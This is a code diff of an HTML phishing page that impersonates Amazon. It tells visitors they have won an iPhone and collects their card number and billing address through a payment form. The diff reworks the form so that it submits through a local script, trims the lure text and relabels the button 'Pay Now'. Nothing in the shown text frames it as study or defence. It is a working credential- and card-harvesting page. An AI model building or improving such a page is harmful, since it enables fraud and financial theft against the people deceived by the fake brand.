@@ -5,19 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon - Claim Your Prize</title>
     <link rel="stylesheet" href="styles.css">
-    <script src="scripts.js" defer></script>
+    <script src="scripts.js"></script>
 </head>
 <body>
     <div class="container">
         <header class="header">
             <img src="amazon-logo.png" alt="Amazon Logo" class="logo">
-            <h1>Congratulations! You've Won an iPhone!</h1>
-            <p>As a valued Amazon customer, you've been selected as a winner in our latest giveaway. Claim your brand new iPhone by paying a small $0.99 shipping fee. Enter your payment details below to secure your prize.</p>
+             <h1>Congratulations! You've Won an iPhone!</h1>
+            <p>As a valued Amazon customer, you've been selected as a winner in our latest giveaway.</p>
         </header>
         
-        <form id="payment-form" name="amazon-prize-form" method="POST" data-netlify="true">
-            <!-- Hidden field for Netlify bot detection -->
-            <input type="hidden" name="form-name" value="amazon-prize-form" />
+        <form id="payment-form">
             <div class="form-group">
                 <label for="card_number">Card Number</label>
                 <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" required pattern="\d{13,19}">
@@ -40,11 +38,11 @@
                 <label for="billing_address">Billing Address</label>
                 <input type="text" id="billing_address" name="billing_address" placeholder="123 Main St, City, State, ZIP" required>
             </div>
-            <button type="submit" class="submit-btn">Pay $0.99 Shipping Fee</button>
+            <button type="submit" class="submit-btn">Pay Now</button>
         </form>
         
         <footer class="footer">
-            <p>&copy; Amazon.com, Inc. or its affiliates. All rights reserved. <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" target="_blank">Privacy Notice</a></p>
+             <p>&copy; Amazon.com, Inc. or its affiliates. All rights reserved. <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" target="_blank">Privacy Notice</a></p>
         </footer>
     </div>
 </body>
